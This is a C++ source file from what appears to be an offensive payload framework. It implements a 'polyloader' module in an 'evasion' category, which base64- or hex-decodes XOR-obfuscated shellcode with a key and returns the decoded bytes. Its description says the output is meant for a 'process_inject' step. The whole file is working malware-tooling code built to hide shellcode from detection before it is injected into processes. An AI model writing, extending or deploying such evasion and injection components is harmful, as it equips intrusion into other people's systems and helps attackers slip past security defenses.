#include <cctype>
#include <cstdio>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+' || c == '-') return 62;
    if (c == '/' || c == '_') return 63;
    return -1;
}

bool b64_decode(const std::string& in, Bytes& out) {
    if (in.empty() || in.size() % 4 != 0) return false;
    out.clear();
    for (size_t i = 0; i < in.size(); i += 4) {
        int pad = 0;
        int vals[4];
        for (int j = 0; j < 4; ++j) {
            char c = in[i + j];
            if (c == '=') {
                if (i + 4 != in.size() || j < 2) return false;
                vals[j] = 0;
                pad++;
            } else {
                int v = b64_val(c);
                if (v < 0) return false;
                if (pad > 0) return false;
                vals[j] = v;
            }
        }
        uint32_t n = ((uint32_t)vals[0] << 18) | ((uint32_t)vals[1] << 12) |
                     ((uint32_t)vals[2] << 6) | (uint32_t)vals[3];
        out.push_back((uint8_t)((n >> 16) & 0xff));
        if (pad < 2) out.push_back((uint8_t)((n >> 8) & 0xff));
        if (pad < 1) out.push_back((uint8_t)(n & 0xff));
    }
    return true;
}

std::string hex_error_text(const std::string& in) {
    auto is_hex = [](char c) {
        return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
    };
    auto bad = [&](size_t i) {
        char c = in[i];
        char buf[64];
        std::snprintf(buf, sizeof(buf), "encoding/hex: invalid byte: U+%04X '%c'",
                      (unsigned)(unsigned char)c, (c >= 32 && c < 127) ? c : '?');
        return std::string(buf);
    };
    for (size_t j = 1; j < in.size(); j += 2) {
        if (!is_hex(in[j - 1])) return bad(j - 1);
        if (!is_hex(in[j])) return bad(j);
    }
    if (in.size() % 2 == 1) {
        if (!is_hex(in[in.size() - 1])) return bad(in.size() - 1);
        return "encoding/hex: odd length hex string";
    }
    return "encoding/hex: invalid byte";
}

bool hex_decode(const std::string& in, Bytes& out) {
    if (in.size() % 2 != 0) return false;
    out.clear();
    auto nib = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return -1;
    };
    for (size_t i = 0; i < in.size(); i += 2) {
        int hi = nib(in[i]);
        int lo = nib(in[i + 1]);
        if (hi < 0 || lo < 0) return false;
        out.push_back((uint8_t)((hi << 4) | lo));
    }
    return true;
}

std::string hex_encode(const Bytes& b) { return to_hex(b); }

class PolyLoader : public Payload {
  public:
    const char* name() const override { return "polyloader"; }
    const char* category() const override { return "evasion"; }
    const char* description() const override {
        return "Polymorphic XOR decode of obfuscated shellcode (feed decoded hex to process_inject)";
    }

    Output execute(const Args& args) const override {
        auto it = args.find("shellcode");
        std::string shellcode = (it == args.end()) ? "" : it->second;
        if (shellcode.empty()) {
            OJ e = OJ::object();
            e["timestamp"] = now_rfc3339();
            e["shellcode_b64"] = "";
            e["error"] = "shellcode argument required (base64/hex XOR-obfuscated)";
            std::string s = MarshalJSON(e);
            return Output(s.begin(), s.end());
        }
        auto kt = args.find("key");
        std::string key = (kt == args.end()) ? "" : kt->second;

        Bytes data;
        if (!b64_decode(shellcode, data) && !hex_decode(shellcode, data)) {
            OJ e = OJ::object();
            e["timestamp"] = now_rfc3339();
            e["shellcode_b64"] = shellcode;
            e["error"] = "failed to decode shellcode: " + hex_error_text(shellcode);
            std::string s = MarshalJSON(e);
            return Output(s.begin(), s.end());
        }

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        r["shellcode_b64"] = shellcode;
        if (!key.empty()) {
            r["key"] = key;
            for (size_t i = 0; i < data.size(); ++i)
                data[i] = (uint8_t)(data[i] ^ (uint8_t)key[i % key.size()]);
        }
        if (!data.empty()) {
            r["decoded_hex"] = hex_encode(data);
            r["decoded_size"] = (int)data.size();
        } else {
            r["error"] = "decoded shellcode is empty";
        }

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

PolyLoader g_polyloader;

struct Reg { Reg() { Register(&g_polyloader); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
